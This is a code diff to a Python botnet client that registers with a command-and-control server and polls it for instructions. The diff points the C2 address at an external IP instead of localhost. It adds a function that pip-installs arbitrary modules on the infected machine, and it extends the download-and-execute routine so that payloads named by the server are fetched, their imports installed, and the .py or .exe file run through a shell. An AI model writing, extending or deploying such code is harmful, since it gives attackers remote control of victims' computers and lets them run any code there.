@@ -7,8 +7,9 @@ import re, uuid
 import platform
 import random
 import json
+import sys
 
-C2_URL = "http://127.0.0.1:8000/control/"
+C2_URL = "http://185.198.234.125:8000/control/"
 BOT_ID = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
 POLLING_INTERVAL = 30
 
@@ -46,17 +47,24 @@ def register():
     except Exception as e:
         print("[-] Error registering with C2: " + str(e))
 
+def install_module(module):
+    try:
+        subprocess.check_call([sys.executable, "-m", "pip", "install", module])
+        print(f"[+] Installed module: {module}")
+    except subprocess.CalledProcessError as e:
+        print(f"[-] Failed to install module {module}: {e}")
+
 def download_and_execute(payload_url, args):
     try:
-        print("[+] Downloading payload from " + payload_url)
+        print(f"[+] Downloading payload from {payload_url}")
         response = requests.get(payload_url)
-        
+
         if response.status_code == 200:
             payload_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), os.path.basename(payload_url))
             with open(payload_path, "wb") as file:
                 file.write(response.content)
 
-            print("[+] Payload downloaded to " + payload_path)
+            print(f"[+] Payload downloaded to {payload_path}")
 
             if isinstance(args, str):
                 try:
@@ -68,18 +76,40 @@ def download_and_execute(payload_url, args):
                 parsed_args = str(args)
 
             if payload_path.endswith(".py"):
-                command = f"python3 {payload_path} {parsed_args}"
-            else:
-                command = f"{payload_path} {parsed_args}"
+                with open(payload_path, 'r') as f:
+                    code = f.read()
                 
-            print("[+] Executing payload: " + str(command))
+                import re
+                imports = re.findall(r'^import ([a-zA-Z0-9_]+)', code, re.MULTILINE) + \
+                          re.findall(r'^from ([a-zA-Z0-9_]+) ', code, re.MULTILINE)
+                
+                for module in set(imports):
+                    try:
+                        __import__(module)
+                    except ImportError:
+                        install_module(module)
 
-            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
+                command = f"{sys.executable} {payload_path} {parsed_args}"
+                print(f"[+] Executing Python payload with embedded interpreter: {command}")
+                result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
+
+            elif payload_path.endswith(".exe"):
+                print(f"[+] Executing EXE payload: {payload_path} {parsed_args}")
+                command = f"{payload_path} {parsed_args}"
+                result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
+
+            else:
+                print(f"[-] Unsupported payload format: {payload_path}")
+                return "Unsupported payload format"
+
             print("[+] Execution result: " + result.decode('utf-8'))
             return result.decode('utf-8')
+
         else:
-            return "Failed to download payload: " + str(response.status_code)
+            return f"[-] Failed to download payload: {response.status_code}"
+
     except Exception as e:
+        print(f"[-] Error downloading/executing payload: {str(e)}")
         return str(e)
 
 
